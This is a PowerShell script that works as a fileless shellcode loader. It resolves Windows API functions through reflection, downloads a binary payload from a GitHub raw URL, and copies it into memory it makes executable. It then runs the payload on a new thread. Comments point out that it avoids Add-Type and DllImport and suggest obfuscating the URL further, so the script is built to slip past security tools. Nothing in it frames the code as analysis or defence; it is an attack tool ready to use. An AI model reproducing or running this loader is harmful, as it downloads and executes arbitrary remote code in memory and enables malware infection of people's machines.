# =====================================================================
#   Reflection-based shellcode runner (no Add-Type / no DllImport block)
#   Downloads from your URL, executes C++ shellcode via thread
# =====================================================================

# ── Helper: Resolve Win32 API function pointer via reflection ──
function LookupFunc {
    Param (
        [string] $moduleName,
        [string] $functionName
    )

    $systemAsm = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll') }

    $unsafe = $systemAsm.GetType('Microsoft.Win32.UnsafeNativeMethods')

    # GetProcAddress has overloads → usually we take the first suitable one
    $gpaMethods = $unsafe.GetMethods() | Where-Object { $_.Name -eq 'GetProcAddress' }
    $gpa = $gpaMethods[0]  # most common overload: (HandleRef, string)

    $gmh = $unsafe.GetMethod('GetModuleHandle')

    $moduleHandle = $gmh.Invoke($null, @($moduleName))
    $funcPtr = $gpa.Invoke($null, @([Runtime.InteropServices.HandleRef]::new([IntPtr]::Zero, $moduleHandle), $functionName))

    return $funcPtr
}

# ── Helper: Create delegate type matching the target function signature ──
function Get-DelegateType {
    Param (
        [Type[]] $parameters = @(),
        [Type]   $returnType = [void]
    )

    $name   = New-Object Reflection.AssemblyName('ReflDel')
    $domain = [AppDomain]::CurrentDomain
    $asm    = $domain.DefineDynamicAssembly($name, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mod    = $asm.DefineDynamicModule('InMemMod', $false)
    $type   = $mod.DefineType('MyDelegate', 'Class,Public,Sealed,AnsiClass,AutoClass', [MulticastDelegate])

    # Constructor
    $ctor = $type.DefineConstructor(
        'RTSpecialName,HideBySig,Public',
        [Reflection.CallingConventions]::Standard,
        @([IntPtr], [Object])
    )
    $ctor.SetImplementationFlags('Runtime,Managed')

    # Invoke method
    $invoke = $type.DefineMethod(
        'Invoke',
        'Public,HideBySig,NewSlot,Virtual',
        $returnType,
        $parameters
    )
    $invoke.SetImplementationFlags('Runtime,Managed')

    return $type.CreateType()
}

# ── Main logic ───────────────────────────────────────────────────────

# Your original URL (you can obfuscate this part further if needed)
$url = "https://github.com/Zakelijkgg/Undefined-BP/raw/refs/heads/main/shellcode.bin"

try {
    $wc = New-Object Net.WebClient
    $shellcode = $wc.DownloadData($url)
}
catch {
    Write-Host "[-] Download failed: $($_.Exception.Message)"
    return
}

$size = $shellcode.Length

# ── Resolve APIs ─────────────────────────────────────────────────────

$ptrVirtualAlloc   = LookupFunc 'kernel32.dll' 'VirtualAlloc'
$ptrVirtualProtect = LookupFunc 'kernel32.dll' 'VirtualProtect'
$ptrCreateThread   = LookupFunc 'kernel32.dll' 'CreateThread'
$ptrWaitForSingle  = LookupFunc 'kernel32.dll' 'WaitForSingleObject'

# ── Create delegate types ────────────────────────────────────────────

$delVirtualAlloc = Get-DelegateType @([IntPtr], [uint32], [uint32], [uint32]) ([IntPtr])
$delVirtualProtect = Get-DelegateType @([IntPtr], [uint32], [uint32], [ref][uint32]) ([bool])
$delCreateThread = Get-DelegateType @([IntPtr], [uint32], [IntPtr], [IntPtr], [uint32], [ref][uint32]) ([IntPtr])
$delWaitForSingle = Get-DelegateType @([IntPtr], [uint32]) ([uint32])

# ── Build callable delegates ─────────────────────────────────────────

$VirtualAlloc   = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrVirtualAlloc,   $delVirtualAlloc)
$VirtualProtect = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrVirtualProtect, $delVirtualProtect)
$CreateThread   = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrCreateThread,   $delCreateThread)
$WaitForSingle  = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrWaitForSingle,  $delWaitForSingle)

# ── Execute shellcode ────────────────────────────────────────────────

try {
    Write-Host "[+] Allocating RW memory..."
    $addr = $VirtualAlloc.Invoke([IntPtr]::Zero, [uint32]$size, 0x3000, 0x04)  # MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE

    if ($addr -eq [IntPtr]::Zero) {
        throw "VirtualAlloc failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    Write-Host "[+] Copying shellcode..."
    [Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)

    Write-Host "[+] Changing protection to RX..."
    $oldProtect = 0
    $success = $VirtualProtect.Invoke($addr, [uint32]$size, 0x20, [ref]$oldProtect)  # PAGE_EXECUTE_READ

    if (-not $success) {
        throw "VirtualProtect failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    Write-Host "[+] Creating thread..."
    $tid = 0
    $thread = $CreateThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)

    if ($thread -eq [IntPtr]::Zero) {
        throw "CreateThread failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    Write-Host "[+] Executing shellcode (waiting for thread)..."
    $null = $WaitForSingle.Invoke($thread, [uint32]::MaxValue)

    Write-Host "[+] Execution finished"
}
catch {
    Write-Host "[-] Error: $($_.Exception.Message)"
}
